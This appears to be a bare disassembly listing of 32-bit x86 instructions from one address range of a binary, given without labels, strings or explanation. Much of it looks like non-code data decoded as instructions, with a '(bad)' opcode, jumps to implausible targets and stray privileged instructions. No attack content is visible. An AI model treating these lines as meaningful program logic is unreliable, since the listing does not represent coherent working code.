  414e45:	or     BYTE PTR [eax],0x90
  414e48:	add    BYTE PTR [eax],cl
  414e4a:	adc    BYTE PTR [ebx],0x38
  414e4d:	or     BYTE PTR [eax],al
  414e4f:	inc    edx
  414e50:	add    al,0x62
  414e52:	add    BYTE PTR [ecx+0x0],0xd1
  414e56:	add    BYTE PTR [eax],bl
  414e58:	add    BYTE PTR [eax+eax*1+0x2300875],al
  414e5f:	dec    ecx
  414e60:	and    BYTE PTR [eax],dl
  414e62:	or     al,0x0
  414e64:	add    BYTE PTR [eax],al
  414e66:	add    BYTE PTR [eax+0x40],ch
  414e69:	add    BYTE PTR [ecx+0x60041052],cl
  414e6f:	adc    BYTE PTR [ecx+0x1],al
  414e72:	add    cl,BYTE PTR [eax]
  414e74:	add    BYTE PTR [eax],al
  414e76:	add    al,BYTE PTR [eax+0x18]
  414e79:	add    ah,BYTE PTR [eax]
  414e7b:	add    BYTE PTR [ecx+0x18000000],al
  414e81:	mov    ah,BYTE PTR [eax]
  414e83:	sub    dl,BYTE PTR [eax]
  414e85:	sbb    DWORD PTR [edx],eax
  414e87:	add    BYTE PTR [ecx],0x0
  414e8a:	or     BYTE PTR [eax+eax*1+0x2c02968],ah
  414e91:	add    eax,0x40c80
  414e96:	adc    DWORD PTR [eax+eax*1],edx
  414e99:	add    BYTE PTR [edx],al
  414e9b:	call   0x30a9d0a0
  414ea0:	add    BYTE PTR [ebp+0x51],al
  414ea3:	add    BYTE PTR [edx],al
  414ea5:	mov    al,ds:0x6180500
  414eaa:	inc    esp
  414eab:	or     BYTE PTR [eax],al
  414ead:	add    BYTE PTR [eax+eax*1],al
  414eb0:	adc    DWORD PTR [ecx],eax
  414eb2:	or     DWORD PTR [ecx],edx
  414eb4:	adc    al,BYTE PTR [eax]
  414eb6:	or     BYTE PTR [edx+0x2],ah
  414eb9:	dec    esp
  414eba:	and    al,0x28
  414ebc:	add    BYTE PTR [eax],bl
  414ebe:	or     cl,BYTE PTR [eax+0x0]
  414ec1:	inc    ecx
  414ec2:	or     BYTE PTR [edx+0x28],al
  414ec5:	add    BYTE PTR [eax],0x0
  414ec8:	add    al,0x0
  414eca:	add    BYTE PTR [eax],cl
  414ecc:	add    BYTE PTR [ecx],cl
  414ece:	add    BYTE PTR [eax+0x16680],al
  414ed4:	add    BYTE PTR [ecx],al
  414ed6:	or     DWORD PTR [esi],esp
  414ed8:	and    BYTE PTR [eax],al
  414eda:	add    DWORD PTR [eax],eax
  414edc:	add    BYTE PTR [eax],0x2
  414edf:	and    DWORD PTR [eax],esp
  414ee1:	add    BYTE PTR [eax+esi*1],ah
  414ee4:	add    al,0x60
  414ee6:	mov    BYTE PTR [edi+0x13601a20],al
  414eec:	adc    BYTE PTR [ecx],al
  414eee:	adc    BYTE PTR [ebx],al
  414ef0:	adc    BYTE PTR [eax],al
  414ef2:	add    al,BYTE PTR [eax]
  414ef4:	adc    BYTE PTR [ecx+0x792a31],cl
  414efa:	and    dl,BYTE PTR [ecx]
  414efc:	add    BYTE PTR [eax],cl
  414efe:	add    BYTE PTR [ecx],dl
  414f00:	sbb    BYTE PTR [eax+0x0],al
  414f03:	add    BYTE PTR fs:[eax],al
  414f06:	sub    DWORD PTR [eax+eax*1],eax
  414f09:	add    BYTE PTR [edx+eax*2],al
  414f0c:	add    BYTE PTR [eax],al
  414f0e:	loope  0x414f18
  414f10:	adc    BYTE PTR [ecx],ah
  414f12:	add    al,BYTE PTR [edx]
  414f14:	imul   eax,DWORD PTR [eax],0xc1100000
  414f1a:	add    BYTE PTR [edx+0x40],al
  414f1d:	add    BYTE PTR [ecx],cl
  414f1f:	inc    ecx
  414f20:	add    BYTE PTR [ecx],0x90
  414f23:	cwde   
  414f24:	or     BYTE PTR [edx+0x20002249],cl
  414f2a:	adc    BYTE PTR [ecx+0x0],dl
  414f2d:	add    DWORD PTR [edx+0x1],eax
  414f30:	and    al,dl
  414f32:	lock add eax,0x5a062150
  414f38:	lock push ecx
  414f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f3b:	add    BYTE PTR [eax+0x8],al
  414f3e:	add    BYTE PTR [eax-0x75deee80],al
  414f44:	add    BYTE PTR [ebp-0x1c],dl
  414f47:	add    al,0x31
  414f49:	add    al,BYTE PTR [eax]
  414f4b:	popa   
  414f4c:	inc    edx
  414f4d:	and    BYTE PTR [eax],al
  414f4f:	and    DWORD PTR [eax],esp
  414f51:	push   es
  414f52:	adc    BYTE PTR [eax],al
  414f54:	bound  eax,QWORD PTR [ecx]
  414f56:	and    BYTE PTR [eax],ah
  414f58:	lea    esp,[edx+0x1c01520]
  414f5e:	or     DWORD PTR [ebp+0x18],eax
  414f61:	add    DWORD PTR ds:0x280,eax
  414f67:	inc    ecx
  414f68:	add    ah,BYTE PTR [eax+edx*1+0x0]
  414f6c:	pop    ds
  414f6d:	push   ecx
  414f6e:	add    BYTE PTR [eax],cl
  414f70:	mov    dl,BYTE PTR [edi+0x5]
  414f73:	mov    al,0x84
  414f75:	and    BYTE PTR [esi+esi*2],ch
  414f78:	dec    ebx
  414f79:	mov    ds:0x10402800,al
  414f7e:	inc    ecx
  414f7f:	add    BYTE PTR [eax],cl
  414f81:	arpl   WORD PTR [eax+0x2418c7c],sp
  414f87:	inc    ecx
  414f88:	(bad)
  414f8b:	add    BYTE PTR [eax+0x9],dl
  414f8e:	add    al,0xe
  414f90:	add    BYTE PTR [eax],dl
  414f92:	inc    esp
  414f93:	inc    ecx
  414f94:	nop
  414f95:	ret    0x864e
  414f98:	add    BYTE PTR [ecx],0x0
  414f9b:	add    BYTE PTR [edx],al
  414f9d:	sub    DWORD PTR [eax],esp
  414f9f:	add    BYTE PTR [ebx],0x95
  414fa2:	inc    eax
  414fa3:	and    BYTE PTR [eax],0x84
  414fa6:	inc    esp
  414fa7:	xor    DWORD PTR [edx],eax
  414fa9:	es or  eax,0x1c419940
  414faf:	inc    eax
  414fb0:	add    BYTE PTR [edx+0xa200000],ah
  414fb6:	adc    BYTE PTR [eax],al
  414fb8:	add    BYTE PTR [eax+0x0],al
  414fbb:	push   ebx
  414fbc:	add    DWORD PTR [eax],esp
  414fbe:	and    eax,DWORD PTR [eax]
  414fc0:	adc    BYTE PTR [ecx+0x0],ah
  414fc3:	or     BYTE PTR [eax],al
  414fc5:	push   es
  414fc6:	add    BYTE PTR [ecx+0x40],al
  414fc9:	adc    dl,BYTE PTR [edx]
  414fcb:	add    BYTE PTR [eax],al
  414fcd:	xor    DWORD PTR [ecx],eax
  414fcf:	add    al,0x20
  414fd1:	sub    DWORD PTR gs:[ebp+0x814782],0x80800092
  414fdc:	adc    al,0x26
  414fde:	inc    edx
  414fdf:	mov    BYTE PTR [eax],dl
  414fe1:	mov    BYTE PTR [ecx],al
  414fe3:	add    BYTE PTR [eax+0x2000280],al
  414fe9:	add    BYTE PTR [eax+0x41],al
  414fec:	nop
  414fed:	add    BYTE PTR [eax],ah
  414fef:	inc    ebp
  414ff0:	inc    edx
  414ff1:	inc    ecx
  414ff2:	add    eax,DWORD PTR [edx+eax*1]
  414ff5:	add    BYTE PTR [eax],0x0
  414ff8:	add    al,0x11
  414ffa:	or     BYTE PTR [eax],al
  414ffc:	add    BYTE PTR [eax],al
  414ffe:	sub    BYTE PTR [edx-0x7fdfbd3b],dh
  415004:	add    BYTE PTR [eax],al
  415006:	add    BYTE PTR [eax],cl
  415008:	add    BYTE PTR ds:0xc18080,al
  41500e:	add    BYTE PTR [eax],cl
  415010:	pop    edx
  415011:	add    BYTE PTR [eax],bl
  415013:	cmp    al,0x8
  415015:	inc    edx
  415016:	add    DWORD PTR [eax],eax
  415018:	add    DWORD PTR [eax],eax
  41501a:	and    dh,BYTE PTR [eax+eax*4]
  41501d:	dec    ecx
  41501e:	mov    BYTE PTR [eax],al
  415020:	test   DWORD PTR [eax],ebx
  415022:	adc    cl,al
  415024:	nop
  415025:	leave  
  415026:	add    DWORD PTR [ecx+0x994401],ecx
  41502c:	dec    ecx
  41502d:	add    al,0x10
  41502f:	add    BYTE PTR [eax],al
  415031:	inc    esp
  415032:	and    BYTE PTR [eax+0x23],al
  415035:	and    BYTE PTR [ecx+0x0],0x84
  415039:	or     BYTE PTR [eax],al
  41503b:	mov    BYTE PTR [ebx+0x51287041],al
  415041:	and    BYTE PTR [eax-0x68],al
  415044:	xchg   esp,eax
  415045:	add    BYTE PTR [ecx+0x2],dl
  415048:	cmp    DWORD PTR [eax+eax*1],ecx
  41504b:	sbb    cl,BYTE PTR [eax+0x56]
  41504e:	add    BYTE PTR [eax],ah
  415050:	inc    eax
  415051:	or     BYTE PTR [eax],al
  415053:	and    edx,DWORD PTR [eax]
  415055:	add    BYTE PTR [eax],al
  415057:	push   edi
  415058:	and    al,0x30
  41505a:	or     BYTE PTR [edx],0x2
  41505d:	inc    ecx
  41505e:	add    DWORD PTR [eax+0x10],ecx
  415061:	push   ebx
  415062:	inc    eax
  415063:	and    BYTE PTR [eax],cl
  415065:	add    BYTE PTR [eax],al
  415067:	leave  
  415068:	shl    BYTE PTR [eax-0x6afff7b0],0x84
  41506f:	loope  0x415071
  415071:	and    BYTE PTR [eax+0x76],al
  415074:	add    al,BYTE PTR [eax]
  415076:	cmp    ah,BYTE PTR [eax+eax*1]
  415079:	and    ah,BYTE PTR [eax+ecx*4]
  41507c:	popa   
  41507d:	and    BYTE PTR [esp+eax*1+0x21900c],al
  415084:	add    BYTE PTR [eax+ecx*2],al
  415087:	add    BYTE PTR [esp+eax*1],dl
  41508a:	add    BYTE PTR [eax],cl
  41508c:	gs and al,0x0
  41508f:	adc    BYTE PTR [eax],bl
  415091:	add    eax,0x80024185
  415096:	add    BYTE PTR [eax+ecx*4],al
  415099:	add    BYTE PTR [edx],al
  41509b:	add    BYTE PTR ds:0xa00000,al
  4150a1:	jno    0x4150ac
  4150a3:	add    al,0x10
  4150a5:	add    al,0x40
  4150a7:	add    al,0x14
  4150a9:	and    BYTE PTR [eax+0x42],al
  4150ac:	add    BYTE PTR [ebx],0x72
  4150af:	push   ebp
  4150b0:	test   eax,0x200801
  4150b5:	add    BYTE PTR [ecx-0x10],al
  4150b8:	add    BYTE PTR [ebx],ch
  4150ba:	add    BYTE PTR [eax],cl
  4150bc:	xor    BYTE PTR [ecx],dh
  4150be:	adc    al,0x4
  4150c0:	inc    edx
  4150c1:	and    DWORD PTR [eax],ebx
  4150c3:	mov    al,BYTE PTR [eax+0x75]
  4150c6:	test   eax,0x597
  4150cb:	pop    ebp
  4150cc:	adc    dl,BYTE PTR [edi+0x41]
  4150cf:	sbb    al,0x80
  4150d1:	add    BYTE PTR [ebx+eax*1+0x10],al
  4150d5:	adc    al,BYTE PTR [edx]
  4150d7:	sbb    ah,BYTE PTR [eax+eax*1]
  4150da:	inc    eax
  4150db:	inc    ecx
  4150dc:	add    eax,0xa00120
  4150e1:	mov    BYTE PTR [eax],al
  4150e3:	call   0x184479c8
  4150e8:	or     al,0x0
  4150ea:	mov    eax,ds:0xa682800
  4150ef:	sbb    BYTE PTR [eax],ah
  4150f1:	retf   0xb405
  4150f4:	adc    BYTE PTR [eax+0x9116081],ah
  4150fa:	dec    esp
  4150fb:	add    BYTE PTR [eax],0x8
  4150fe:	adc    BYTE PTR [eax],al
  415100:	mov    BYTE PTR [eax],0x0
  415103:	mov    eax,ds:0x50d000
  415108:	add    dl,BYTE PTR [eax+0x1]
  41510b:	inc    ebx
  41510c:	add    al,0x0
  41510e:	sbb    BYTE PTR [eax+eiz*4],al
  415111:	inc    eax
  415112:	add    BYTE PTR [ecx],0xc0
  415115:	inc    ecx
  415116:	add    BYTE PTR [eax+0x428b0081],dh
  41511c:	add    DWORD PTR [ecx],0x98002
  415122:	add    BYTE PTR [edx+0x812443],al
  415128:	add    DWORD PTR [eax],eax
  41512a:	cwde   
  41512b:	or     DWORD PTR [eax],ecx
  41512d:	sbb    DWORD PTR [edx],esp
  41512f:	inc    ecx
  415130:	sbb    al,BYTE PTR [eax]
  415132:	xchg   ebp,eax
  415133:	mov    al,BYTE PTR [edx-0x7f7fcb00]
  415139:	or     BYTE PTR [esi+0x24],al
  41513c:	add    BYTE PTR [eax],al
  41513e:	add    al,0x2
  415140:	popa   
  415141:	add    BYTE PTR [eax-0x72],al
  415144:	add    al,BYTE PTR [eax-0x78]
  415147:	or     BYTE PTR [eax],al
  415149:	push   ds
  41514a:	add    al,0x2
  41514c:	popa   
  41514d:	mov    ah,0xb0
  41514f:	add    al,0x44
  415151:	inc    eax
  415152:	add    al,BYTE PTR [eax+0x41]
  415155:	xor    BYTE PTR [eax],cl
  415157:	add    al,BYTE PTR [eax]
  415159:	add    al,0x0
  41515b:	add    BYTE PTR [eax+0x410104],dl
  415161:	add    BYTE PTR [ecx+ecx*4],ah
  415164:	add    al,0x48
  415166:	add    BYTE PTR [eax],0x5
  415169:	add    BYTE PTR [eax],ah
  41516b:	or     DWORD PTR [eax],eax
  41516d:	inc    ecx
  41516e:	add    BYTE PTR [eax+0x1],al
  415171:	sbb    BYTE PTR [ebx],al
  415173:	add    BYTE PTR [ecx],bh
  415175:	xor    BYTE PTR [esi],0x40
  415178:	adc    eax,eax
  41517a:	add    BYTE PTR [ecx+0x15],al
  41517d:	enter  0x88a,0x0
  415181:	in     eax,0x0
  415183:	xor    DWORD PTR [ecx+0x8002e90],0x9045d72a
  41518d:	xchg   BYTE PTR [eax],al
  41518f:	call   0x84:0x45050
  415196:	adc    al,BYTE PTR [eax]
  415198:	dec    ecx
  415199:	or     BYTE PTR [eax+0x73],dl
  41519c:	add    BYTE PTR [edx+0x4],ch
  41519f:	and    BYTE PTR [edx],ah
  4151a1:	adc    DWORD PTR [eax],ecx
  4151a3:	or     BYTE PTR [eax+eax*1],dl
  4151a6:	adc    BYTE PTR [eax+0x8046000],al
  4151ac:	add    BYTE PTR [eax+0x41],al
  4151b2:	cs dec esi
  4151b4:	rol    BYTE PTR [eax],1
  4151b6:	cmp    BYTE PTR [eax],al
  4151b8:	push   edx
  4151b9:	add    DWORD PTR [eax],eax
  4151bb:	mov    dl,0x53
  4151bd:	add    BYTE PTR [eax+0x0],0xc1
  4151c1:	mov    BYTE PTR [eax-0x3f0ebcdf],cl
  4151c7:	popa   
  4151c8:	or     ecx,esi
  4151ca:	sub    BYTE PTR [edx-0x80],al
  4151cd:	mov    BYTE PTR [edx],dl
  4151cf:	inc    eax
  4151d0:	add    al,BYTE PTR [eax]
  4151d2:	add    al,0x58
  4151d4:	add    BYTE PTR [eax],dl
  4151d6:	sbb    DWORD PTR [edx+0x2008],eax
  4151dc:	and    BYTE PTR [eax+0x0],al
  4151df:	or     BYTE PTR [eax-0x4f],al
  4151e2:	and    BYTE PTR [eax],dl
  4151e4:	sbb    DWORD PTR [eax+0x1],eax
  4151e7:	push   ss
  4151e8:	cmp    al,BYTE PTR [ecx]
  4151ea:	add    dl,BYTE PTR [eax]
  4151ec:	adc    DWORD PTR [eax],0x1861a001
  4151f2:	xchg   edx,eax
  4151f3:	inc    ebx
  4151f4:	add    BYTE PTR [eax],dl
  4151f6:	or     DWORD PTR [eax+0x14],eax
  4151f9:	dec    ecx
  4151fa:	add    BYTE PTR [eax],cl
  4151fc:	mov    al,ds:0x81010100
  415201:	dec    eax
  415202:	add    al,BYTE PTR [eax]
  415204:	add    al,0x2d
  415206:	adc    BYTE PTR [eax],cl
  415208:	sub    al,0x7
  41520a:	add    DWORD PTR [eax],eax
  41520c:	adc    BYTE PTR [edx],al
  41520e:	sub    BYTE PTR [eax+0x45],ah
  415211:	and    BYTE PTR [eax+eiz*1],al
  415214:	add    BYTE PTR [eax+edx*1],al
  415217:	inc    eax
  415218:	mov    eax,ds:0x4200020c
  41521d:	sub    ah,BYTE PTR [eax-0x75ffff67]
  415223:	inc    ecx
  415224:	add    eax,DWORD PTR [esi+0x10]
  415227:	add    dl,BYTE PTR [edx-0x7e]
  41522a:	loopne 0x4151ac
  41522c:	inc    eax
  41522d:	adc    BYTE PTR [eax],bl
  41522f:	mov    DWORD PTR [eax],eax
  415231:	and    al,0x42
  415233:	dec    ecx
  415234:	add    DWORD PTR [edx+0x88c000a],eax
  41523a:	inc    ebp
  41523b:	add    DWORD PTR [ecx],eax
  41523d:	sub    DWORD PTR [eax+0x28004008],esi
  415243:	add    BYTE PTR [eax],al
  415245:	cmp    BYTE PTR [edx],al
  415247:	adc    BYTE PTR [eax],al
  415249:	add    BYTE PTR [ebx-0x68],0x0
  41524d:	add    BYTE PTR [eax],al
  41524f:	adc    BYTE PTR [ecx],cl
  415251:	mov    BYTE PTR [ecx+0x8182001],al
  415257:	add    BYTE PTR [ecx],ah
  415259:	add    al,0x5
  41525b:	add    BYTE PTR [eax+0x41b080],al
  415261:	add    BYTE PTR [edx],ah
  415263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415264:	add    BYTE PTR [ecx-0x3eaedfe2],al
  41526a:	add    BYTE PTR [ebx+0x2],ah
  41526d:	mov    DWORD PTR [eax],ecx
  41526f:	add    BYTE PTR [eax],dl
  415271:	mov    WORD PTR [ebp+0x21000400],es
  415277:	adc    BYTE PTR [eax],al
  415279:	add    BYTE PTR [eax+0x0],dl
  41527c:	add    DWORD PTR [eax+0x1],esp
  41527f:	adc    eax,0x24324800
  415284:	add    BYTE PTR [ecx],ch
  415286:	dec    esp
  415287:	bound  eax,QWORD PTR [eax]
  415289:	and    ch,dl
  41528b:	add    BYTE PTR [ecx+0x2c0404b2],ch
  415291:	adc    BYTE PTR [eax],dl
  415293:	add    BYTE PTR [eax],ah
  415295:	add    al,0xe0
  415297:	and    BYTE PTR [edx],dl
  415299:	add    BYTE PTR [esp+eax*2],al
  41529c:	mov    eax,DWORD PTR [eax+0x3a]
  41529f:	or     DWORD PTR [eax+edx*4-0x1fbbfac8],ebp
  4152a6:	mov    al,ds:0x24080100
  4152ab:	inc    eax
  4152ac:	call   0x21668b14
  4152b1:	add    BYTE PTR [eax],ah
  4152b3:	or     BYTE PTR [eax],al
  4152b5:	adc    DWORD PTR [edx+0x1],0x18014654
  4152bc:	or     BYTE PTR [eax],bh
  4152be:	add    BYTE PTR [eax],al
  4152c0:	add    DWORD PTR [esi+0x2161a00],esp
  4152c6:	add    al,al
  4152c8:	sbb    BYTE PTR [ecx-0x7afeadbd],0x0
  4152cf:	nop
  4152d0:	and    al,0x89
  4152d2:	adc    BYTE PTR [eax+eax*1],cl
  4152d5:	test   BYTE PTR [eax],bl
  4152d7:	and    BYTE PTR [eax],ah
  4152d9:	inc    eax
  4152da:	mov    ds:0x410022,eax
  4152df:	ret    0x12
  4152e2:	add    DWORD PTR [eax+eax*2],eax
  4152e5:	add    BYTE PTR [eax],cl
  4152e7:	inc    ecx
  4152e8:	add    DWORD PTR [ecx+0x6a102400],ecx
  4152ee:	add    ah,BYTE PTR [eax]
  4152f0:	push   es
  4152f1:	xor    BYTE PTR [eax+eax*1+0x17110882],al
  4152f8:	add    BYTE PTR [edx+0x5],al
  4152fb:	add    al,BYTE PTR [ecx+ecx*1]
  4152fe:	xor    BYTE PTR [ecx],al
  415300:	rol    BYTE PTR [eax+edx*1],0x18
  415304:	or     BYTE PTR [eax],al
  415306:	add    BYTE PTR [ecx],ch
  415308:	enter  0x4188,0x20
  41530c:	add    DWORD PTR [edx+0x65801000],ebp
  415312:	add    DWORD PTR [edx+eax*1],esp
  415315:	add    bl,BYTE PTR [edx+0x0]
  415318:	add    BYTE PTR [ebx],al
  41531a:	adc    ah,BYTE PTR [ecx+0x40]
  41531d:	adc    BYTE PTR [eax+0x15488400],ah
  415323:	add    BYTE PTR [eax],al
  415325:	mov    ds:0x5010d41,al
  41532a:	add    DWORD PTR [ecx],0x8024181
  415330:	mov    es,WORD PTR [eax]
  415332:	pushf  
  415333:	nop
  415334:	mov    al,dl
  415336:	mov    BYTE PTR [eax+eiz*1+0x40e00081],ah
  41533d:	inc    eax
  41533e:	pusha  
  41533f:	test   DWORD PTR [eax],edx
  415341:	cdq    
  415342:	inc    edx
  415343:	xor    BYTE PTR [ecx+ecx*8],al
  415346:	add    BYTE PTR [ecx+0x0],al
  415349:	and    BYTE PTR [ecx+0x42],ch
  41534c:	push   cs
  41534d:	mov    cl,BYTE PTR [eax]
  41534f:	and    DWORD PTR [edi+0x9],eax
  415352:	add    bl,BYTE PTR [eax]
  415354:	popa   
  415355:	adc    BYTE PTR [eax],al
  415357:	inc    eax
  415358:	mov    al,0x4
  41535a:	test   BYTE PTR [eax],al
  41535c:	and    DWORD PTR [eax+0x40208220],esp
  415362:	add    BYTE PTR [eax],0x80
  415365:	mov    al,ds:0x41610480
  41536a:	add    al,BYTE PTR [eax]
  41536c:	loopne 0x415372
  41536e:	test   al,0x60
  415370:	add    BYTE PTR [eax],dl
  415372:	xchg   esp,eax
  415373:	adc    al,0x0
  415375:	adc    al,0x0
  415377:	inc    edx
  415378:	add    BYTE PTR [ecx+0x63],al
  41537b:	sub    BYTE PTR [eax],cl
  41537d:	add    al,0x8
  41537f:	xchg   ecx,eax
  415380:	adc    al,BYTE PTR [eax]
  415382:	add    BYTE PTR ds:0x185001,al
  415388:	add    BYTE PTR [ecx+0x20400],0x50
  41538f:	inc    esp
  415390:	add    BYTE PTR [ecx],cl
  415392:	popa   
  415393:	inc    eax
  415394:	add    BYTE PTR [eax],dl
  415396:	inc    ecx
  415397:	mov    ch,0x98
  415399:	add    al,BYTE PTR [eax+ebp*4]
  41539c:	add    BYTE PTR [eax+0x48000a],ah
  4153a2:	or     DWORD PTR [eax+0xc0a4144],ecx
  4153a8:	add    BYTE PTR [eax],al
  4153aa:	add    BYTE PTR [eax],dh
  4153ac:	add    BYTE PTR [edi+0x40],ah
  4153af:	and    al,BYTE PTR [edx]
  4153b1:	add    DWORD PTR [eax],eax
  4153b3:	sub    BYTE PTR [ecx+eiz*1],dl
  4153b6:	inc    ecx
  4153b7:	pusha  
  4153b8:	rol    BYTE PTR [eax-0x40],0x0
  4153bc:	inc    esi
  4153bd:	and    cl,BYTE PTR [eax]
  4153bf:	jo     0x4153dd
  4153c1:	or     ah,BYTE PTR [eax+0x2]
  4153c4:	dec    esp
  4153c5:	add    BYTE PTR [edx],ah
  4153c7:	lldt   WORD PTR [edi+0x410440]
  4153ce:	add    BYTE PTR [eax+0x1610000],al
  4153d4:	push   es
  4153d5:	inc    ebp
  4153d6:	adc    BYTE PTR gs:[ecx+0x0],0x11
  4153db:	dec    ecx
  4153dc:	adc    al,0x21
  4153de:	or     al,BYTE PTR [eax]
  4153e0:	add    BYTE PTR [eax],al
  4153e2:	int3   
  4153e3:	ror    BYTE PTR [eax],cl
  4153e5:	adc    DWORD PTR [eax+0x30],ecx
  4153e8:	jo     0x41543b
  4153ea:	add    BYTE PTR [esi],al
  4153ec:	inc    ecx
  4153ed:	add    BYTE PTR [eax],al
  4153ef:	add    BYTE PTR [eax+0x2ab18043],al
  4153f5:	pusha  
  4153f6:	or     BYTE PTR [eax],al
  4153f8:	inc    ecx
  4153f9:	inc    ebx
  4153fa:	add    cl,BYTE PTR [eax+eax*4+0x14]
  4153fe:	popa   
  4153ff:	add    dh,al
  415401:	push   eax
  415402:	or     BYTE PTR [ecx],al
  415404:	add    BYTE PTR [ecx+0x9881919],dl
  41540a:	adc    eax,edx
  41540c:	add    BYTE PTR [eax+ecx*1],ch
  41540f:	dec    eax
  415410:	nop
  415411:	and    al,0x93
  415413:	pop    eax
  415414:	adc    eax,0x30004142
  415419:	add    BYTE PTR [ecx],dl
  41541b:	add    BYTE PTR [esi+0x49],al
  41541e:	test   eax,0x4841134a
  415423:	xor    al,0x10
  415425:	or     DWORD PTR [eax],eax
  415427:	inc    eax
  415428:	test   BYTE PTR [eax],ah
  41542a:	or     al,0x40
  41542c:	or     al,BYTE PTR [ebx]
  41542e:	jp     0x4153b3
  415430:	test   al,0x2
  415432:	or     al,BYTE PTR [ebx]
  415434:	sbb    al,0x20
  415436:	inc    eax
  415437:	imul   eax,DWORD PTR [edx+0xe],0x800082c1
  41543e:	and    DWORD PTR [eax],eax
  415440:	inc    ecx
  415441:	and    BYTE PTR [eax],al
  415443:	add    DWORD PTR [edx],edx
  415445:	test   BYTE PTR [eax-0x60],al
  415448:	add    eax,0x6898e100
  41544d:	add    al,0x1
  41544f:	adc    BYTE PTR [eax],ch
  415451:	xor    BYTE PTR [esi],dl
  415453:	add    al,0x20
  415455:	and    al,0x31
  415457:	and    BYTE PTR [ecx],0x16
  41545a:	add    eax,0x200600
  41545f:	and    BYTE PTR [eax],ah
  415461:	inc    eax
  415462:	push   es
  415463:	adc    al,0xa3
  415465:	push   0x49
  415467:	add    BYTE PTR [ecx+0x40],ah
  41546a:	add    BYTE PTR [eax],al
  41546c:	add    al,0x9
  41546e:	add    BYTE PTR [eax],ah
  415470:	push   ebp
  415471:	nop
  415472:	test   BYTE PTR [eax],al
  415474:	adc    BYTE PTR [eax+0x45],dl
  415477:	xchg   edx,eax
  415478:	and    BYTE PTR [eax],ch
  41547a:	add    BYTE PTR [eax],dh
  41547c:	add    al,dh
  41547e:	popf   
  41547f:	dec    eax
  415480:	add    BYTE PTR [ecx+0x20206108],ah
  415486:	dec    eax
  415487:	or     BYTE PTR [edx+0x254322],cl
  41548d:	adc    DWORD PTR [ecx],0xc0000
  415493:	add    DWORD PTR ds:0x69842081,esp
  415499:	add    BYTE PTR [eax],dl
  41549b:	sbb    BYTE PTR [esi+0x50],dh
  41549e:	add    BYTE PTR [eax],al
  4154a0:	sbb    BYTE PTR [eax],0x41
  4154a3:	add    BYTE PTR [edx],al
  4154a5:	add    BYTE PTR [eax+eax*1+0x24400103],cl
  4154ac:	xor    BYTE PTR [edx],0x83
  4154af:	add    BYTE PTR [eax],cl
  4154b1:	push   0x40410818
  4154b6:	add    BYTE PTR [eax],al
  4154b8:	add    eax,DWORD PTR [ecx+eiz*4]
  4154bb:	add    al,BYTE PTR [ecx]
  4154bd:	and    BYTE PTR [eax],al
  4154bf:	add    BYTE PTR [eax],0x0
  4154c2:	add    BYTE PTR [eax],al
  4154c4:	add    DWORD PTR [ecx],eax
  4154c6:	mov    BYTE PTR [eax-0x7df5f75d],al
  4154cc:	or     BYTE PTR [eax+0x48],al
  4154cf:	or     ah,BYTE PTR [ebx]
  4154d1:	add    BYTE PTR [eax],al
  4154d3:	pusha  
  4154d4:	push   eax
  4154d5:	add    BYTE PTR [edx],al
  4154d7:	add    al,0x18
  4154d9:	out    0x0,eax
  4154db:	or     BYTE PTR [eax],al
  4154dd:	dec    eax
  4154de:	sbb    BYTE PTR [eax],ah
  4154e0:	nop
  4154e1:	add    BYTE PTR [edx],0x4
  4154e4:	add    eax,0x8df11174
  4154e9:	and    BYTE PTR [eax],al
  4154eb:	add    eax,0x810110
  4154f0:	add    cl,BYTE PTR [ebx+0x48]
  4154f3:	pop    edx
  4154f4:	adc    al,BYTE PTR [eax]
  4154f6:	add    BYTE PTR fs:[esi],dl
  4154f9:	sbb    DWORD PTR [ecx+0x840040],ecx
  4154ff:	add    BYTE PTR [eax],al
  415501:	inc    eax
  415502:	add    al,bh
  415504:	and    DWORD PTR [eax],esi
  415506:	rcl    DWORD PTR ds:0xa000a019,0x0
  41550d:	add    BYTE PTR [eax+eax*8],al
  415510:	dec    eax
  415511:	add    DWORD PTR [ecx+0x0],esp
  415514:	and    al,0x40
  415516:	and    BYTE PTR [eax],cl
  415518:	inc    eax
  415519:	add    DWORD PTR [ecx+0x4b012808],0x62000010
  415523:	inc    eax
  415524:	add    al,0x2
  415526:	or     BYTE PTR [edx+0x8],0x81
  41552a:	add    DWORD PTR [ecx],eax
  41552c:	push   es
  41552d:	and    DWORD PTR [eax],edx
  41552f:	and    DWORD PTR [eax+0x51],ebx
  415532:	in     eax,dx
  415533:	push   esp
  415534:	adc    BYTE PTR [ecx],al
  415536:	add    al,0x0
  415538:	pusha  
  415539:	inc    edx
  41553a:	sub    BYTE PTR [ecx+0x2d],al
  41553d:	sub    BYTE PTR [ecx+0x10],0x1
  415541:	or     BYTE PTR [eax],al
  415543:	inc    ecx
  415544:	add    al,0x0
  415546:	or     BYTE PTR [esi],ah
  415548:	add    BYTE PTR [ecx],cl
  41554a:	inc    ebx
  41554b:	xchg   esp,eax
  41554c:	adc    BYTE PTR [eax],0x5b
  41554f:	add    BYTE PTR [eax],cl
  415551:	nop
  415552:	add    BYTE PTR [esi],dl
  415554:	add    esi,DWORD PTR [eax]
  415556:	add    BYTE PTR [eax],al
  415558:	mov    al,ds:0x42090101
  41555d:	inc    eax
  41555e:	or     BYTE PTR [ebx],al
  415560:	jecxz  0x415562
  415562:	and    BYTE PTR [eax+0x60],ah
  415565:	inc    ecx
  415566:	rol    DWORD PTR [eax+eax*4+0x20000600],0x94
  41556e:	add    DWORD PTR [eax],eax
  415570:	and    eax,0x18
  415575:	mov    al,ds:0x97804088
  41557a:	adc    BYTE PTR [eax],al
  41557c:	inc    ecx
  41557d:	fs call 0x20415593
  415583:	or     BYTE PTR [edx],al
  415585:	mov    eax,ds:0x8c0010c
  41558a:	rol    DWORD PTR [ecx+eax*2],0x0
  41558e:	bound  eax,QWORD PTR [eax]
  415590:	add    cl,BYTE PTR [eax]
  415592:	sbb    BYTE PTR [eax+0x9],0x64
  415596:	mov    eax,ds:0x46400400
  41559b:	cmp    BYTE PTR [eax+eax*1],al
  41559e:	test   DWORD PTR [eax],eax
  4155a0:	inc    eax
  4155a1:	add    BYTE PTR [ecx-0x1f],al
  4155a4:	sbb    BYTE PTR [edx+0x12],dl
  4155a7:	or     al,BYTE PTR [eax]
  4155a9:	or     eax,0x414a160
  4155ae:	inc    ebx
  4155af:	and    BYTE PTR [edx],al
  4155b1:	inc    ecx
  4155b2:	add    al,BYTE PTR [eax]
  4155b4:	jge    0x41554e
